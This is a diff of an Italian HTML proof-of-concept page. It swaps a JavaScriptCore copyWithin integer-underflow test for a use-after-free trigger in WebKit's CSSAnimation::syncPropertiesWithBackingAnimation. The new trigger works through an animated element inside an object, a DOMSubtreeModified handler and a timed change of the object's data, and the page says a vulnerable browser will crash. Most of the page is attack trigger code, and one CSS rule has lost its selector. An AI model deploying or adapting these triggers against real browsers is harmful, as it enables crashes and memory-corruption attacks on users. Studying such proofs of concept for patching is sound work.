@@ -1,34 +1,80 @@
 <!DOCTYPE html>
-<html>
+<html lang="it">
 <head>
-    <title>Test WebKit JSC</title>
-</head>
-<body>
-    <h1>WebKit JSC Test Page</h1>
-    <script>
-        function triggerUnderflow() {
-            try {
-                // 1. Creazione di un ArrayBuffer e TypedArray manipolato
-                const buffer = new ArrayBuffer(0x1000);
-                const evilArray = new Uint8Array(buffer);
-
-                // 2. Parametri calcolati per forzare l'integer underflow
-                const start = -0x7FFFFFFF;  // Valore negativo estremo
-                const target = 0x7FFFFFFF;  // Valore oltre i limiti del buffer
-
-                // 3. Chiamata a copyWithin con parametri "velenosi"
-                evilArray.copyWithin(start, 0, target);
-
-                // 4. Verifica del comportamento anomalo
-                alert("[TEST] Nessun crash rilevato (vulnerabilità patchata?)");
-            } catch (e) {
-                alert("[TEST] Eccezione:", e.message);
-            }
+    <meta charset="UTF-8" />
+    <title>PoC UAF in CSSAnimation::syncPropertiesWithBackingAnimation</title>
+    <style>
+      
+        @keyframes example {
+            from { opacity: 1; }
+            to { opacity: 0; }
         }
 
-        
-        
-        window.onload = triggerUnderflow;
+     
+        cite {
+            display: inline-block;
+           
+            animation: example 1s infinite;
+        }
+
+      
+            border: 1px solid #666;
+            width: 200px;
+            height: 50px;
+            margin: 40px auto;
+            display: block;
+        }
+    </style>
+</head>
+<body onload="startPoC()">
+    <h3 style="text-align:center;">
+        PoC: crash di WebKit in <code>syncPropertiesWithBackingAnimation()</code>
+    </h3>
+
+
+    <object id="obj" type="image/png">
+  
+        <cite id="cited">Testo animato</cite>
+    </object>
+
+    <script>
+    function startPoC() {
+        const obj   = document.getElementById("obj");
+        const cited = document.getElementById("cited");
+
+      
+        obj.addEventListener("DOMSubtreeModified", onSubtreeModified);
+
+   
+        cited.style.animationIterationCount = "infinite";
+
+    
+        setTimeout(() => {
+            obj.data = "nonexistent.png";
+        }, 50);
+    }
+
+    function onSubtreeModified() {
+        const cited = document.getElementById("cited");
+        if (!cited)
+            return;
+
+      
+        const anims = cited.getAnimations();
+        if (anims.length === 0)
+            return;
+
+       
+        cited.style.animationDuration = "2s";
+
+
+        document.getElementById("obj")
+                .removeEventListener("DOMSubtreeModified", onSubtreeModified);
+    }
     </script>
+
+    <p style="text-align:center; color: #f00;">
+        Su WebKit vulnerabile, il browser andrà in crash
+    </p>
 </body>
 </html>
